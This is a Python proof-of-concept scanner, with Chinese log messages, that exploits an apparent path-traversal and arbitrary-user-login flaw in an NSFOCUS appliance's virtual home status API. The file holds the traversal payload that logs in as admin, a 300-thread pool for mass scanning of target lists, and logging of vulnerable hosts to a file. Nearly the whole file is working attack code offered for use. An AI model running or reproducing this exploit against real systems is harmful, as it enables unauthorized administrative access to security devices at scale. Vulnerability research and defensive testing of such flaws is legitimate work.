import requests
import argparse
import sys
from multiprocessing.dummy import Pool
import logging

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 代理设置
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def banner():
    banner = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|




                            version:1.1.0
                            author:fangwei   
	"""
    logging.info(banner)


def poc(target):
    payload_url = ("/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web"
                   "/apache2/www/local_user.php&method=login&user_account=admin")
    url = target + payload_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) "
                      "Version/12.0.3 Safari/605.1.15",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"
    }

    try:
        res = requests.get(url=target, verify=False, allow_redirects=False)
        res1 = requests.get(url=url, headers=headers, verify=False)

        if res.status_code == 200:
            if res1.status_code == 200 and "status" in res1.text and "exception" not in res1.text:
                logging.info(f"{GREEN}[+]该url存在任意用户登录漏洞：{target}\n{RESET}")
                with open("bljre.txt", "a", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                logging.info(f"[-]该url不存在任意用户登录漏洞")
        else:
            logging.warning(f"该url连接失败: {target}")
    except Exception as e:
        logging.error(f"[*]该url出现错误: {target}, 错误信息: {e}")


def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", type=str, help="please write link")
    parser.add_argument("-f", "--file", dest="file", type=str, help="please write file\' path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for i in f.readlines():
                url_list.append(i.strip().replace("\n", ""))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logging.error("Usage: python {sys.argv[0]} -h")


if __name__ == "__main__":
    main()
